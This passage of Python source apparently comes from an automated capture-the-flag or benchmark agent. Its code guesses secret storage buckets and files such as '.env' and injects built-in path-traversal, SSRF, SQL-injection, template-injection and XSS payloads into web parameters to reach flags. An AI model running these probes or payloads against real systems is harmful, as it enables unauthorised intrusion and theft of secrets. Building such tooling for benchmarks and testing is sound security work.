            dict.fromkeys(
                ("api", "admin", "flag", "config", "internal")
                + external
            )
        )

    def _benchmark_response_path_keys(self) -> tuple[str, ...]:
        data = self._benchmark_external_profiles()
        external = self._benchmark_string_tuple(data.get("response_path_keys"), limit=80)
        builtin = (
            "path",
            "url",
            "uri",
            "endpoint",
            "route",
            "debug_path",
            "debug_url",
            "config_path",
            "config_url",
            "export_path",
            "export_url",
            "download_path",
            "download_url",
        )
        keys: list[str] = []
        for raw_key in builtin + external:
            key = str(raw_key or "").strip().lower()
            if _re_mod.fullmatch(r"[a-z0-9_.-]{1,80}", key):
                keys.append(key)
        return tuple(dict.fromkeys(keys))

    @staticmethod
    def _benchmark_safe_response_path_value(raw: str) -> str | None:
        value = str(raw or "").strip()
        if not value or len(value) > 220:
            return None
        if value.startswith(("javascript:", "mailto:", "data:", "#", "//")):
            return None
        if not _re_mod.fullmatch(r"(?:https?://[^\s\"'<>`{}|]+|/?[A-Za-z0-9_./?=&:%+\-]+)", value):
            return None
        return value

    def _benchmark_response_key_path_urls(self, base: str, text: str) -> list[str]:
        if not text:
            return []
        keys = self._benchmark_response_path_keys()
        if not keys:
            return []
        key_pattern = "|".join(_re_mod.escape(key) for key in keys)
        candidates: list[str] = []
        search_text = text[:30000]
        quoted_pattern = (
            rf"""["'](?:{key_pattern})["']\s*[:=]\s*["']([^"']{{1,220}})["']"""
        )
        bare_pattern = (
            rf"""(?:^|[\s,{{])(?:{key_pattern})\s*[:=]\s*([^,\s<>"'{{}}]{{1,220}})"""
        )
        for pattern in (quoted_pattern, bare_pattern):
            for raw_value in _re_mod.findall(pattern, search_text, flags=_re_mod.IGNORECASE):
                value = self._benchmark_safe_response_path_value(raw_value)
                if value is not None:
                    candidates.append(value)
        urls: list[str] = []
        for value in candidates:
            url = _urljoin(base, value)
            if self._benchmark_url_is_same_container(base, url):
                urls.append(url)
        return list(dict.fromkeys(urls))[:40]

    def _benchmark_object_storage_probe_urls(
        self,
        base: str,
        html: str,
        attr_values: list[str],
    ) -> list[str]:
        lowered = html.lower()
        if not any(
            marker in lowered
            for marker in ("s3", "bucket", "object storage", "对象存储", "path-style")
        ):
            return []
        discovered_buckets: set[str] = set()
        for value in attr_values:
            parsed = _urlparse(_urljoin(base, value))
            if not self._benchmark_url_is_same_container(base, _urlunparse(parsed)):
                continue
            first_segment = parsed.path.strip("/").split("/", 1)[0]
            if _re_mod.fullmatch(r"[A-Za-z0-9][A-Za-z0-9_.-]{1,63}", first_segment):
                discovered_buckets.add(first_segment)
        for raw in _re_mod.findall(r"/([A-Za-z0-9][A-Za-z0-9_.-]{1,63})/", html):
            if raw.lower() not in {"html", "body", "head"}:
                discovered_buckets.add(raw)
        for raw in _re_mod.findall(r"""["']([A-Za-z0-9][A-Za-z0-9_.-]{1,63})["']""", html):
            if any(token in raw.lower() for token in ("secret", "private", "internal", "data")):
                discovered_buckets.add(raw)
        for raw in _re_mod.findall(r"<Name>([^<]{1,120})</Name>", html):
            if _re_mod.fullmatch(r"[A-Za-z0-9][A-Za-z0-9_.-]{1,63}", raw):
                discovered_buckets.add(raw)
        listed_keys = [
            key for key in _re_mod.findall(r"<Key>([^<]{1,240})</Key>", html)
            if not key.startswith("/")
        ]
        common_buckets = self._benchmark_object_storage_buckets()
        buckets = sorted(discovered_buckets) + [
            bucket for bucket in common_buckets
            if bucket not in discovered_buckets
        ]
        keys = self._benchmark_object_storage_keys()
        urls: list[str] = []
        for bucket in buckets:
            for key in keys:
                path = f"{bucket}/" if not key else f"{bucket}/{key}"
                urls.append(_urljoin(base, path))
            for key in listed_keys:
                urls.append(_urljoin(base, f"{bucket}/{key}"))
        return urls[:30]

    def _benchmark_object_storage_buckets(self) -> list[str]:
        data = self._benchmark_external_profiles()
        external = self._benchmark_string_tuple(data.get("object_storage_buckets"), limit=80)
        builtin = [
            "company-secrets",
            "secret-data",
            "secret",
            "secrets",
            "private",
            "internal",
            "flag",
            "flags",
            "backup",
            "backups",
        ] if self._benchmark_builtin_section_enabled("object_storage") else []
        return list(dict.fromkeys(list(external) + builtin))

    def _benchmark_object_storage_keys(self) -> tuple[str, ...]:
        data = self._benchmark_external_profiles()
        external = self._benchmark_string_tuple(data.get("object_storage_keys"), limit=120)
        builtin = (
            "",
            "flag",
            "flag.txt",
            "flags.txt",
            "secret",
            "secret.txt",
            ".env",
            "config.json",
            "backup.zip",
            "README.md",
            "README.txt",
        ) if self._benchmark_builtin_section_enabled("object_storage") else ()
        return tuple(dict.fromkeys(external + builtin))

    @staticmethod
    def _benchmark_url_is_same_container(base: str, url: str) -> bool:
        base_parsed = _urlparse(base)
        parsed = _urlparse(url)
        return parsed.scheme in {"http", "https"} and parsed.netloc == base_parsed.netloc

    def _benchmark_payload_urls_for_query_url(self, url: str) -> list[str]:
        parsed = _urlparse(url)
        pairs = _parse_qsl(parsed.query, keep_blank_values=True)
        results: list[str] = []
        for key, _ in pairs:
            for payload in self._benchmark_payloads_for_param(key):
                new_pairs = [
                    (item_key, payload if item_key == key else item_value)
                    for item_key, item_value in pairs
                ]
                results.append(_urlunparse(parsed._replace(query=_urlencode(new_pairs))))
        return results

    def _benchmark_payload_urls_for_param(self, base: str, name: str) -> list[str]:
        return [
            f"{base}?{_urlencode({name: payload})}"
            for payload in self._benchmark_payloads_for_param(name)
        ]

    def _benchmark_payloads_for_param(self, name: str) -> list[str]:
        lowered = name.lower()
        payloads: list[str] = []
        if self._benchmark_builtin_section_enabled("payloads"):
            if any(
                part in lowered
                for part in ("file", "path", "page", "template", "view", "filename")
            ):
                payloads.extend([
                    "../flag",
                    "../../flag",
                    "../../../../flag",
                    "/flag",
                    "php://filter/convert.base64-encode/resource=index.php",
                ])
            if any(
                part in lowered
                for part in ("url", "uri", "redirect", "next", "target", "return")
            ):
                payloads.extend([
                    "file:///flag",
                    "http://127.0.0.1/flag",
                    "http://localhost/flag",
                    "http://0.0.0.0/flag",
                ])
            if (
                lowered in {"id", "uid", "user", "user_id", "account", "post", "pid"}
                or lowered.endswith("_id")
            ):
                payloads.extend(["1 OR 1=1", "1' OR '1'='1", "0", "../flag"])
            if any(
                part in lowered
                for part in ("name", "q", "query", "search", "keyword", "message")
            ):
                payloads.extend([
                    "{{7*7}}",
                    "${7*7}",
                    "' OR '1'='1",
                    _url_quote("<script>alert(1)</script>"),
                ])
            if not payloads:
                payloads.extend(["{{7*7}}", "' OR '1'='1", "../flag"])
        payloads.extend(self._benchmark_external_payloads_for_param(lowered))
        return list(dict.fromkeys(payloads))[
            : self._benchmark_control_int("max_payloads_per_param")
        ]

    def _benchmark_external_payloads_for_param(self, lowered_name: str) -> list[str]:
        data = self._benchmark_external_profiles()
        raw_profiles = data.get("param_payload_profiles", data.get("payload_profiles", []))
        if not isinstance(raw_profiles, list):
            return []
        payloads: list[str] = []
        for raw in raw_profiles[:80]:
            if not isinstance(raw, dict):
                continue
            exact = self._benchmark_string_tuple(raw.get("name_exact"), limit=40)
            contains = self._benchmark_string_tuple(raw.get("name_contains"), limit=40)
            suffixes = self._benchmark_string_tuple(raw.get("name_suffix"), limit=40)
            matched = (
                lowered_name in {item.lower() for item in exact}
                or any(item.lower() in lowered_name for item in contains)
                or any(lowered_name.endswith(item.lower()) for item in suffixes)
            )
            if not matched:
                continue
            payloads.extend(self._benchmark_string_tuple(raw.get("payloads"), limit=40))
        return payloads

    def _benchmark_builtin_service_action_profiles(self) -> dict[str, dict[str, Any]]:
        return {}

    def _benchmark_normalize_service_action_profile(
        self,
        raw: Any,
    ) -> tuple[str, dict[str, Any]] | None:
        if not isinstance(raw, dict):
            return None
        fingerprint = str(raw.get("fingerprint") or "").strip().lower()
        if not _re_mod.fullmatch(r"[a-z0-9_.-]{1,80}", fingerprint):
            return None
        profile: dict[str, Any] = {}
        label = str(raw.get("label") or fingerprint).strip()
        if label:
            profile["label"] = label[:80]
        probe_key = str(raw.get("probe_key") or "").strip().lower()
        probe = self._benchmark_service_probe_registry().get(probe_key)
        if callable(probe):
            profile["probe"] = probe
        raw_actions = raw.get("actions")
        if not isinstance(raw_actions, dict):
            return None
        actions: dict[str, dict[str, str]] = {}
        for action in ("handoff", "exploit", "close"):
            raw_action = raw_actions.get(action)
            if raw_action is True:
                actions[action] = {}
                continue
            if not isinstance(raw_action, dict):
                continue
            action_profile: dict[str, str] = {}
            for key in ("reasoning_reason", "abandon_reason", "summary"):
                value = str(raw_action.get(key) or "").strip()
                if value:
                    action_profile[key] = value[:800]
            actions[action] = action_profile
        if not actions:
            return None
        profile["actions"] = actions
        return fingerprint, profile

    def _benchmark_external_service_action_profiles(self) -> dict[str, dict[str, Any]]:
        data = self._benchmark_external_profiles()
        raw_profiles = data.get("service_action_profiles", data.get("action_profiles", []))
        if not isinstance(raw_profiles, list):
            return {}
        profiles: dict[str, dict[str, Any]] = {}
        for raw in raw_profiles[:40]:
            normalized = self._benchmark_normalize_service_action_profile(raw)
            if normalized is None:
                continue
            fingerprint, profile = normalized
            profiles[fingerprint] = profile
        return profiles

    def _benchmark_service_action_profiles(self) -> dict[str, dict[str, Any]]:
        disabled = self._benchmark_disabled_builtin_fingerprints()
        profiles = {
            key: dict(value)
            for key, value in self._benchmark_builtin_service_action_profiles().items()
            if key not in disabled
        }
        for fingerprint, external in self._benchmark_external_service_action_profiles().items():
            merged = dict(profiles.get(fingerprint, {}))
            if "actions" in merged and "actions" in external:
                actions = dict(merged.get("actions") or {})
                for action, action_profile in (external.get("actions") or {}).items():
                    action_merged = dict(actions.get(action) or {})
                    action_merged.update(action_profile)
                    actions[action] = action_merged
                merged["actions"] = actions
            external_without_actions = {
                key: value for key, value in external.items() if key != "actions"
            }
            merged.update(external_without_actions)
            if "actions" in external and "actions" not in merged:
                merged["actions"] = external["actions"]
            profiles[fingerprint] = merged
        return profiles

    def _benchmark_service_action_from_desc(self, desc: str) -> tuple[str, str] | None:
        lowered = desc.lower()
        for fingerprint, profile in self._benchmark_service_action_profiles().items():
            if f"benchmark {fingerprint}" not in lowered:
                continue
            actions = profile.get("actions") or {}
            if "handoff step 1" in lowered and "handoff" in actions:
                return fingerprint, "handoff"
            if "exploit step 2" in lowered and "exploit" in actions:
                return fingerprint, "exploit"
            if "close step 3" in lowered and "close" in actions:
                return fingerprint, "close"
        return None
